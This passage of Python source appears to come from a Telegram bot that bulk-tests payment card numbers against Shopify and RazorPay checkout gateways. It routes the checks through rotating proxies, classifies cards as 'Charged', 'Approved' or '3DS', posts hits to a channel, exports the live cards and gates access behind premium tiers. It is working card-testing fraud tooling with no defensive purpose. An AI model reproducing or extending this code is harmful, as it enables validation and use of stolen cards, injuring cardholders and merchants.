        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid card')}</b>"))
    card = cards[0]
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"

    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{card}</code>..."))
    st = time.time()
    rotator = SmartRotator()
    http_session = await get_user_http_session(uid, "rz")
    sem = get_user_sem(uid, "rz")
    try:
        async with sem:
            result, proxy_used = await check_rz_with_retry(
                card, proxies, max_retries=2,
                rotator=rotator, http_session=http_session)
        elapsed = time.time() - st
        bin_tuple = await get_bin_info(card.split('|')[0])
        text = format_rz_single(result, bin_tuple, elapsed)
        status = result.get('status', 'Dead')
        _consume_free(uid)
        if status in ("Charged", "Approved", "3DS"):
            if status == "Charged":
                increment_charge_count(uid)
            video_path = _pick_hit_video()
            try:
                await status_msg.delete()
            except Exception:
                pass
            await styled_reply(event, text, buttons=HIT_BUTTON)
            asyncio.create_task(send_realtime_hit(uid, result, status, name, "RazorPay", video_path=video_path))
        else:
            await edit_entities(status_msg, text, buttons=HIT_BUTTON)
    except Exception as e:
        try:
            await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"), parse_mode='html')
        except Exception:
            pass
    finally:
        await cleanup_user_http_session(uid, "rz")


# ====================== PROGRESS UI ======================
def _fmt_eta(seconds: float) -> str:
    if seconds <= 0 or seconds > 86400:
        return "—"
    seconds = int(seconds)
    h, m, s = seconds // 3600, (seconds % 3600) // 60, seconds % 60
    if h:
        return f"{h}h {m:02d}m"
    if m:
        return f"{m}m {s:02d}s"
    return f"{s}s"


def _build_bar(pct: int, length: int = 16) -> str:
    pct = max(0, min(100, pct))
    filled = int(round(length * pct / 100))
    return "▰" * filled + "▱" * (length - filled)


async def update_progress(user_id: int, message_id: int, results: dict,
                          current_checked: int, gateway_type: str = "Shopify"):
    total = results.get('total', 1) or 1
    checked = results.get('checked', 0)
    remaining = max(total - checked, 0)
    elapsed = max(0.0, time.time() - results.get('start_time', time.time()))
    h, m, s = int(elapsed) // 3600, (int(elapsed) % 3600) // 60, int(elapsed) % 60
    pct = int((checked / total) * 100) if total else 0
    bar = _build_bar(pct, 16)
    last_card = (results.get('last_card') or 'None')
    last_resp = (results.get('last_response') or 'Waiting...')[:22]
    last_price = (results.get('last_price') or '-')[:8]
    n_charged = len(results.get('charged', []))
    n_approved = len(results.get('approved', []))
    n_3ds = len(results.get('3ds', []))
    n_dead = len(results.get('dead', []))
    n_errors = len(results.get('errors', []))
    hits = n_charged + n_approved + n_3ds
    hit_rate = (hits / checked * 100.0) if checked > 0 else 0.0
    if checked > 0 and remaining > 0:
        rate = checked / elapsed if elapsed > 0 else 0
        eta_sec = (remaining / rate) if rate > 0 else 0
        eta_str = _fmt_eta(eta_sec)
    elif remaining == 0:
        eta_str = "done"
    else:
        eta_str = "—"
    cps = (checked / elapsed) if elapsed > 0 else 0.0

    text = pe(f"""💳 {bs('Card')}: <code>{last_card}</code>
📝 {bs('Response')}: <code>{last_resp}</code>
💰 {bs('Price')}: <code>{last_price}</code>
{SEP}
{bar}  <b>{pct}%</b>
{SEP}
🥇 {bs('Charged')}: {n_charged}   🥈 {bs('Approved')}: {n_approved}
🥉 {bs('3DS')}: {n_3ds}   🥔 {bs('Declined')}: {n_dead}
🧨 {bs('Errors')}: {n_errors}
{SEP}
📊 {checked}/{total}  ━  ⏳ {bs('Left')}: {remaining}
🎯 {bs('Hit-rate')}: <b>{hit_rate:.2f}%</b>  ━  ⚡ {cps:.1f}/s
⏱️ {h:02d}:{m:02d}:{s:02d}  ━  🕐 {bs('ETA')}: {eta_str}
""")

    prefix = "razorpay" if gateway_type.lower() == "razorpay" else "shopify"
    buttons = [
        [pbtn(f"🥇 {bs('Charged')} {n_charged}",
              data=f"{prefix}_export_charged:{user_id}", style="success", icon="🥇"),
         pbtn(f"🥈 {bs('Approved')} {n_approved}",
              data=f"{prefix}_export_approved:{user_id}", style="primary", icon="🥈")],
        [pbtn(f"🥉 {bs('3DS')} {n_3ds}",
              data=f"{prefix}_export_3ds:{user_id}", style="primary", icon="🥉"),
         pbtn(f"🧨 {bs('Errors')} {n_errors}",
              data=f"{prefix}_export_errors:{user_id}", style="danger", icon="🧨")],
        [pbtn(f"⛔ {bs('Stop')}", data=f"stop_{user_id}", style="danger", icon="⛔")],
    ]
    try:
        text_clean, ents = build_entities(text)
        await client_instance.edit_message(
            user_id, message_id, text_clean,
            formatting_entities=ents,
            buttons=buttons, link_preview=False)
    except Exception:
        pass


# ====================== FINAL RESULTS ======================
async def send_final_results(user_id: int, results: dict, gateway_type: str = "Shopify"):
    elapsed = int(time.time() - results.get('start_time', time.time()))
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    time_fmt = f"{h}h {m}m {s}s" if h else f"{m}m {s}s" if m else f"{s}s"
    charged = len(results.get('charged', []))
    approved = len(results.get('approved', []))
    threeds = len(results.get('3ds', []))
    dead = len(results.get('dead', []))
    errors = len(results.get('errors', []))
    total = results.get('total', 0) or 1
    hit_rate = ((charged + approved + threeds) / total * 100.0) if total else 0.0

    summary = pe(f"""✅ <b>{bs('Check Complete')}</b>
{SEP}
📊 <b>{bs('Results')}</b> ({gateway_type}):
   ┣ 🥇 {bs('Charged')}: {charged}
   ┣ 🥈 {bs('Approved')}: {approved}
   ┣ 🥉 {bs('3DS')}: {threeds}
   ┣ 🥔 {bs('Declined')}: {dead}
   ┣ 🧨 {bs('Errors')}: {errors}
   ┗ 📊 {bs('Total')}: {results.get('total', 0)}
{SEP}
🎯 {bs('Hit-rate')}: <b>{hit_rate:.2f}%</b>
⏱️ {bs('Time')}: {time_fmt}
{SEP}
{DEV_LINE}""")

    prefix = "razorpay" if gateway_type.lower() == "razorpay" else "shopify"
    buttons = []
    if charged:
        buttons.append([pbtn(f"🥇 {bs('Export Charged')} ({charged})",
                             data=f"{prefix}_export_charged:{user_id}",
                             style="success", icon="🥇")])
    if approved:
        buttons.append([pbtn(f"🥈 {bs('Export Approved')} ({approved})",
                             data=f"{prefix}_export_approved:{user_id}",
                             style="primary", icon="🥈")])
    if threeds:
        buttons.append([pbtn(f"🥉 {bs('Export 3DS')} ({threeds})",
                             data=f"{prefix}_export_3ds:{user_id}",
                             style="primary", icon="🥉")])
    if errors:
        buttons.append([pbtn(f"🧨 {bs('Export Errors')} ({errors})",
                             data=f"{prefix}_export_errors:{user_id}",
                             style="danger", icon="🧨")])

    try:
        await send_entities(user_id, summary, buttons=buttons or None)
    except Exception as e:
        log_system("RESULT", f"final send failed to {user_id}: {e}", "error")


# ====================== MASS: SHOPIFY ======================
async def start_mass_shopify(user_id: int, cards: list, event, status_msg):
    sites = load_sites()
    if not sites:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No sites')}</b>"))
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = sender.username or f"user_{user_id}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{user_id}", "User"

    session_key = f"{user_id}_{status_msg.id}"
    ACTIVE_SESSIONS[session_key] = {"paused": False, "stopped": False}
    results = {
        'charged': [], 'approved': [], '3ds': [], 'dead': [], 'errors': [],
        'total': len(cards), 'checked': 0, 'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Shopify',
    }
    user_sem = get_user_sem(user_id, "msp")
    http_session = await get_user_http_session(user_id, "msp")
    rotator = SmartRotator()
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_ui = [time.time()]

    cached_sites = sites
    cached_proxies = proxies
    last_refresh = [0]

    def _stop():
        s = ACTIVE_SESSIONS.get(session_key)
        return not s or s.get("stopped", False)

    async def worker():
        while not queue.empty():
            if _stop():
                return
            s = ACTIVE_SESSIONS.get(session_key)
            if not s:
                return
            while s.get("paused", False):
                await asyncio.sleep(1)
                s = ACTIVE_SESSIONS.get(session_key)
                if not s:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            nonlocal cached_sites, cached_proxies
            async with user_sem:
                if results['checked'] - last_refresh[0] >= 50:
                    cached_sites = load_sites()
                    cached_proxies = load_user_proxies(user_id)
                    last_refresh[0] = results['checked']
                if not cached_sites or not cached_proxies:
                    break
                result, proxy_used = await check_card_with_retry(
                    card, cached_sites, cached_proxies, max_retries=2,
                    rotator=rotator, http_session=http_session)
            if _stop():
                return
            results['checked'] += 1
            results['last_card'] = card
            results['last_response'] = (result.get('message') or '')[:50]
            results['last_price'] = result.get('price', '-')
            results['last_gateway'] = result.get('gateway', 'Shopify')
            status = result.get('status', 'Dead')
            if status in ('Charged', 'Approved', '3DS'):
                video_path = _pick_hit_video()
                if status == 'Charged':
                    results['charged'].append(result)
                    increment_charge_count(user_id)
                elif status == 'Approved':
                    results['approved'].append(result)
                else:
                    results['3ds'].append(result)
                asyncio.create_task(send_realtime_hit(user_id, result, status, name, "Shopify", video_path=video_path))
                asyncio.create_task(send_hit_to_channel(
                    card, status, result.get('message', ''), result.get('gateway', 'Shopify'),
                    result.get('price', '-'), user_mention=f"@{username}" if username else name,
                    user_id=user_id, gateway_type="Shopify",
                    site=result.get('site'), proxy_used=proxy_used,
                    video_path=video_path))
            elif status == 'Error':
                results['errors'].append(result)
            else:
                results['dead'].append(result)
            queue.task_done()
            await asyncio.sleep(0)
            if time.time() - last_ui[0] >= 1.0:
                last_ui[0] = time.time()
                if session_key in ACTIVE_SESSIONS:
                    try:
                        await update_progress(user_id, status_msg.id, results, results['checked'], "Shopify")
                    except Exception:
                        pass

    workers = [asyncio.create_task(worker()) for _ in range(MSP_PER_USER_WORKERS)]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        try:
            await update_progress(user_id, status_msg.id, results, results['checked'], "Shopify")
        except Exception:
            pass
        try:
            await status_msg.delete()
        except Exception:
            pass
        SHOPIFY_RESULTS[user_id] = results
        await send_final_results(user_id, results, "Shopify")
        ACTIVE_SESSIONS.pop(session_key, None)
        await cleanup_user_http_session(user_id, "msp")
        cleanup_user_sem(user_id)
        await asyncio.sleep(300)
        SHOPIFY_RESULTS.pop(user_id, None)


# ====================== MASS: RAZORPAY ======================
async def start_mass_rz(user_id: int, cards: list, event, status_msg):
    if not RAZORPAY_ENABLED:
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = sender.username or f"user_{user_id}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{user_id}", "User"

    session_key = f"rz_{user_id}_{status_msg.id}"
    ACTIVE_SESSIONS[session_key] = {"paused": False, "stopped": False}
    results = {
        'charged': [], 'approved': [], '3ds': [], 'dead': [], 'errors': [],
        'total': len(cards), 'checked': 0, 'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'RazorPay',
    }
    user_sem = get_user_sem(user_id, "mrz")
    http_session = await get_user_http_session(user_id, "mrz")
    rotator = SmartRotator()
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_ui = [time.time()]

    cached_proxies = proxies
    last_refresh = [0]

    def _stop():
        s = ACTIVE_SESSIONS.get(session_key)
        return not s or s.get("stopped", False)

    async def worker():
        while not queue.empty():
            if _stop():
                return
            s = ACTIVE_SESSIONS.get(session_key)
            if not s:
                return
            while s.get("paused", False):
                await asyncio.sleep(1)
                s = ACTIVE_SESSIONS.get(session_key)
                if not s:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            nonlocal cached_proxies
            async with user_sem:
                if results['checked'] - last_refresh[0] >= 50:
                    cached_proxies = load_user_proxies(user_id)
                    last_refresh[0] = results['checked']
                if not cached_proxies:
                    break
                result, proxy_used = await check_rz_with_retry(
                    card, cached_proxies, max_retries=2,
                    rotator=rotator, http_session=http_session)
            if _stop():
                return
            results['checked'] += 1
            results['last_card'] = card
            results['last_response'] = (result.get('Response') or '')[:50]
            results['last_price'] = result.get('Price', '-')
            results['last_gateway'] = result.get('Gateway', 'RazorPay')
            status = result.get('status', 'Dead')
            if status in ('Charged', 'Approved', '3DS'):
                video_path = _pick_hit_video()
                if status == 'Charged':
                    results['charged'].append(result)
                    increment_charge_count(user_id)
                elif status == 'Approved':
                    results['approved'].append(result)
                else:
                    results['3ds'].append(result)
                asyncio.create_task(send_realtime_hit(user_id, result, status, name, "RazorPay", video_path=video_path))
            elif status == 'Error':
                results['errors'].append(result)
            else:
                results['dead'].append(result)
            queue.task_done()
            await asyncio.sleep(0)
            if time.time() - last_ui[0] >= 1.0:
                last_ui[0] = time.time()
                if session_key in ACTIVE_SESSIONS:
                    try:
                        await update_progress(user_id, status_msg.id, results, results['checked'], "RazorPay")
                    except Exception:
                        pass

    workers = [asyncio.create_task(worker()) for _ in range(MRZ_PER_USER_WORKERS)]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        try:
            await update_progress(user_id, status_msg.id, results, results['checked'], "RazorPay")
        except Exception:
            pass
        try:
            await status_msg.delete()
        except Exception:
            pass
        RAZORPAY_RESULTS[user_id] = results
        await send_final_results(user_id, results, "RazorPay")
        ACTIVE_SESSIONS.pop(session_key, None)
        await cleanup_user_http_session(user_id, "mrz")
        cleanup_user_sem(user_id)
        await asyncio.sleep(300)
        RAZORPAY_RESULTS.pop(user_id, None)


# ====================== MASS COMMANDS ======================
@client.on(events.NewMessage(pattern=r'^[/.](msh|msp)$'))
async def cmd_msh(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)

    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a .txt file with')} <code>/msh</code>\n"
            f"📋 {bs('Max')}: "
            f"<code>{MASS_HARD_CAP_ADMIN if uid in ADMIN_ID else MASS_HARD_CAP_PREMIUM}</code> "
            f"{bs('cards per file')}"
        ))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))

    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('No cards in file')}</b>"))

    HARD_CAP = MASS_HARD_CAP_ADMIN if uid in ADMIN_ID else MASS_HARD_CAP_PREMIUM
    user_limit = get_cc_limit(uid)
    limit = min(user_limit, HARD_CAP)

    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, pe(
            f"⚠️ <b>{bs('File trimmed')}</b>\n{SEP}\n"
            f"📋 {bs('Limit')}: <code>{limit}</code> {bs('cards')}"
        ))
    status_msg = await styled_reply(event, pe(f"💎 {bs('Starting Shopify mass check')} <code>{len(cards)}</code>..."))
    asyncio.create_task(start_mass_shopify(uid, cards, event, status_msg))


@client.on(events.NewMessage(pattern=r'^[/.]mrz$'))
async def cmd_mrz(event):
    if not RAZORPAY_ENABLED:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Razorpay')}</b>\n{SEP}\n"
            f"💎 <i>{bs('Temporarily unavailable')}</i>"))
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file with')} <code>/mrz</code>"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('No cards in file')}</b>"))
    HARD_CAP = MASS_HARD_CAP_ADMIN if uid in ADMIN_ID else MASS_HARD_CAP_PREMIUM
    limit = min(get_cc_limit(uid), HARD_CAP)
    if len(cards) > limit:
        cards = cards[:limit]
    status_msg = await styled_reply(event, pe(f"💎 {bs('Starting RazorPay mass check')} <code>{len(cards)}</code>..."))
    asyncio.create_task(start_mass_rz(uid, cards, event, status_msg))


# ====================== STOP ======================
@client.on(events.CallbackQuery(pattern=rb"^stop_(\d+)$"))
async def cb_stop(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not yours!", alert=True)
    stopped = 0
    for key in list(ACTIVE_SESSIONS.keys()):
        if key.startswith(f"{uid}_") or key.startswith(f"rz_{uid}_"):
            ACTIVE_SESSIONS[key]["stopped"] = True
            stopped += 1
    await event.answer(f"Stopped {stopped}", alert=True)


@client.on(events.NewMessage(pattern=r'^[/.]stop$'))
async def cmd_stop(event):
    uid = event.sender_id
    stopped = 0
    for key in list(ACTIVE_SESSIONS.keys()):
        if key.startswith(f"{uid}_") or key.startswith(f"rz_{uid}_"):
            ACTIVE_SESSIONS[key]["stopped"] = True
            stopped += 1
    if stopped:
        await styled_reply(event, pe(f"🛑 {bs('Stopped')} {stopped} {bs('session(s)')}"))
    else:
        await styled_reply(event, pe(f"⚠️ {bs('No active session')}"))


# ====================== EXPORT ======================
async def _export_category(event, user_id: int, gateway: str, category: str):
    if event.sender_id != user_id:
        return await event.answer("Not your results!", alert=True)
    results = SHOPIFY_RESULTS.get(user_id) if gateway == "shopify" else RAZORPAY_RESULTS.get(user_id)
    if not results:
        return await event.answer("Results expired", alert=True)
    items = results.get(category, [])
    if not items:
        return await event.answer(f"No {category} cards", alert=True)
    fname = f"NOVA_{gateway}_{category}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            await f.write(f"{category.upper()} ({gateway.upper()})\n{'='*40}\n\n")
            for i, item in enumerate(items, 1):
                card = item.get('card', '-')
                resp = (item.get('message') or item.get('Response') or '')[:100]
                gw = item.get('gateway') or item.get('Gateway') or gateway
                price = item.get('price') or item.get('Price') or '-'
                await f.write(f"[{i}] {card}\n    Response: {resp}\n    Gateway: {gw}\n    Price: {price}\n{'-'*30}\n")
            await f.write(f"\nTotal: {len(items)}\nExported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        await send_file_entities(
            user_id, fname,
            pe(f"✅ {bs(category.capitalize())} ({len(items)})"))
        os.remove(fname)
    except Exception as e:
        log_system("EXPORT", f"failed: {e}", "error")
    await event.answer("Sent!", alert=False)


@client.on(events.CallbackQuery(pattern=rb"^(shopify|razorpay)_export_(charged|approved|3ds|errors):(\d+)$"))
async def cb_export(event):
    m = event.pattern_match
    gateway = m.group(1).decode()
    category = m.group(2).decode()
    user_id = int(m.group(3).decode())
    await _export_category(event, user_id, gateway, category)


# ====================== /status & /api ======================
@client.on(events.NewMessage(pattern=r'^[/.]status$'))
async def cmd_status(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, build_status_text())


@client.on(events.NewMessage(pattern=r'^[/.]api$'))
async def cmd_api(event):
    if event.sender_id not in ADMIN_ID:
        return
    api_base = SHOPIFY_API_URL.rsplit('/check', 1)[0]
    try:
        session = await get_http_session()
        async with session.get(f"{api_base}/health",
                               timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status != 200:
                return await styled_reply(event, pe(
                    f"❌ <b>{bs('API DOWN')}</b>\n{SEP}\nHTTP <code>{r.status}</code>\n<code>{api_base}</code>"
                ))
            data = await r.json(content_type=None)
        await styled_reply(event, pe(
            f"🔌 <b>{bs('API Health')}</b>\n{SEP}\n"
            f"📌 <code>{api_base}</code>\n"
            f"✅ ok: <code>{data.get('ok')}</code>\n"
            f"🧵 threads: <code>{data.get('threads')}</code>\n"
            f"🔁 retries: <code>{data.get('retries')}</code>\n"
            f"🌊 pool: <code>{data.get('proxy_pool', 0)}</code>\n"
            f"📦 version: <code>{data.get('version', '?')}</code>"
        ))
    except Exception as e:
        await styled_reply(event, pe(
            f"❌ <b>{bs('API unreachable')}</b>\n{SEP}\n"
            f"📌 <code>{api_base}</code>\n🔴 <code>{e}</code>"
        ))


# ====================== PROXY SYSTEM ======================
@client.on(events.NewMessage(pattern=r'^[/.]addproxy$'))
async def cmd_addproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    lines = []
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if reply and reply.file:
            try:
                path = await reply.download_media()
                async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [ln.strip() for ln in (await f.read()).splitlines() if ln.strip()]
                os.remove(path)
            except Exception as e:
                return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
        elif reply and reply.text:
            lines = [ln.strip() for ln in reply.text.splitlines() if ln.strip()]
    else:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) == 2:
            lines = [ln.strip() for ln in parts[1].splitlines() if ln.strip()]
    if not lines:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Add proxies')}</b>\n{SEP}\n"
            f"💎 <i>Send one per line:</i>\n"
            f"<code>/addproxy\nip:port:user:pass\nip:port</code>"))
    current = load_user_proxies(uid)
    if len(current) >= MAX_PROXIES_PER_USER:
        return await styled_reply(event, pe(f"💎 <b>{bs('Proxy limit')}</b> <code>{len(current)}/{MAX_PROXIES_PER_USER}</code>"))

    existing = set()
    for p in current:
        pp = parse_proxy_format(p)
        if pp and pp.get('username') and pp.get('password'):
            existing.add(f"{pp['ip']}:{pp['port']}:{pp['username']}:{pp['password']}")
        elif pp:
            existing.add(f"{pp['ip']}:{pp['port']}")
        else:
            existing.add(p)

    to_check, duplicates = [], 0
    for raw in lines:
        parsed = parse_proxy_format(raw)
        if not parsed:
            log_system("PROXY_PARSE", f"rejected: {raw[:60]}", "warning")
            continue
        if parsed['username'] and parsed['password']:
            norm = f"{parsed['ip']}:{parsed['port']}:{parsed['username']}:{parsed['password']}"
        else:
            norm = f"{parsed['ip']}:{parsed['port']}"
        if norm in existing:
            duplicates += 1
            continue
        to_check.append(norm)
        existing.add(norm)

    if not to_check:
        return await styled_reply(event, pe(f"💎 <b>{bs('No new proxies')}</b>\n💎 {bs('Duplicates')}: <code>{duplicates}</code>"))
    slots = MAX_PROXIES_PER_USER - len(current)
    to_check = to_check[:slots]
    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{len(to_check)}</code>..."))
    sem = get_user_sem(uid, "proxy")
    alive, dead = [], []
    checked = 0

    async def _check_one(p):
        nonlocal checked
        async with sem:
            res = await test_proxy(p)
        checked += 1
        if res['status'] == 'alive':
            alive.append(p)
        else:
            dead.append(p)
        if checked % 5 == 0 or checked == len(to_check):
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Checking')}</b> [{checked}/{len(to_check)}]\n"
                    f"✅ {bs('Alive')}: <code>{len(alive)}</code> | ❌ {bs('Dead')}: <code>{len(dead)}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

    try:
        for i in range(0, len(to_check), PROXY_PER_USER_WORKERS):
            batch = to_check[i:i + PROXY_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(p) for p in batch])
        if alive:
            save_user_proxies(uid, current + alive)
        total_now = len(load_user_proxies(uid))
        await status_msg.edit(pe(
            f"✅ <b>{bs('Proxy check complete')}</b>\n{SEP}\n"
            f"✅ {bs('Alive (added)')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead (ignored)')}: <code>{len(dead)}</code>\n"
            f"⚠️ {bs('Existing (skipped)')}: <code>{duplicates}</code>\n"
            f"📁 {bs('Total')}: <code>{total_now}/{MAX_PROXIES_PER_USER}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"), parse_mode='html')
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]proxy$'))
async def cmd_proxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{len(proxies)}</code>..."))
    sem = get_user_sem(uid, "proxy")
    alive, dead, checked = [], [], 0

    async def _check_one(p):
        nonlocal checked
        async with sem:
            res = await test_proxy(p)
        checked += 1
        if res['status'] == 'alive':
            alive.append(p)
        else:
            dead.append(p)
        if checked % 5 == 0 or checked == len(proxies):
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Checking proxies')}</b> [{checked}/{len(proxies)}]\n"
                    f"✅ <code>{len(alive)}</code> | ❌ <code>{len(dead)}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

    try:
        for i in range(0, len(proxies), PROXY_PER_USER_WORKERS):
            batch = proxies[i:i + PROXY_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(p) for p in batch])
        save_user_proxies(uid, alive)
        await status_msg.edit(pe(
            f"✅ <b>{bs('Proxy check complete')}</b>\n{SEP}\n"
            f"📁 {bs('Total')}: <code>{len(proxies)}</code>\n"
            f"✅ {bs('Alive')}: <code>{len(alive)}</code>\n"
            f"🗑 {bs('Removed dead')}: <code>{len(dead)}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"), parse_mode='html')
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]chkproxy\s+'))
async def cmd_chkproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/chkproxy ip:port:user:pass</code>"))
    proxy = parts[1].strip()
    if not parse_proxy_format(proxy):
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid format')}</b>"))
    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{proxy[:40]}</code>..."))
    res = await test_proxy(proxy)
    if res['status'] == 'alive':
        await status_msg.edit(pe(
            f"✅ <b>{bs('Alive')}</b>\n{SEP}\n🌐 IP: <code>{res.get('ip', '?')}</code>\n🔌 <code>{proxy}</code>"
        ), parse_mode='html', link_preview=False)
    else:
        await status_msg.edit(pe(f"❌ <b>{bs('Dead')}</b>\n{SEP}\n🔌 <code>{proxy}</code>"),
                             parse_mode='html', link_preview=False)


@client.on(events.NewMessage(pattern=r'^[/.]rmproxy\s+'))
async def cmd_rmproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/rmproxy ip:port:user:pass</code>"))
    raw = parts[1].strip()
    parsed = parse_proxy_format(raw)
    if not parsed:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid format')}</b>"))
    if parsed['username'] and parsed['password']:
        target = f"{parsed['ip']}:{parsed['port']}:{parsed['username']}:{parsed['password']}"
    else:
        target = f"{parsed['ip']}:{parsed['port']}"
    proxies = load_user_proxies(uid)
    if target not in proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not in your list')}</b>"))
    proxies = [p for p in proxies if p != target]
    save_user_proxies(uid, proxies)
    await styled_reply(event, pe(f"✅ <b>{bs('Removed')}</b>\n🔌 <code>{target}</code>\n📁 <code>{len(proxies)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]rmproxyindex\s+'))
async def cmd_rmproxyindex(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/rmproxyindex 1,2,3</code>"))
    try:
        idxs = sorted({int(x.strip()) - 1 for x in parts[1].split(',') if x.strip()})
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid indices')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    valid = [i for i in idxs if 0 <= i < len(proxies)]
    if not valid:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid indices')}</b>"))
    removed = [proxies[i] for i in valid]
    keep = [p for i, p in enumerate(proxies) if i not in set(valid)]
    save_user_proxies(uid, keep)
    removed_str = "\n".join(f"🔌 <code>{p}</code>" for p in removed[:10])
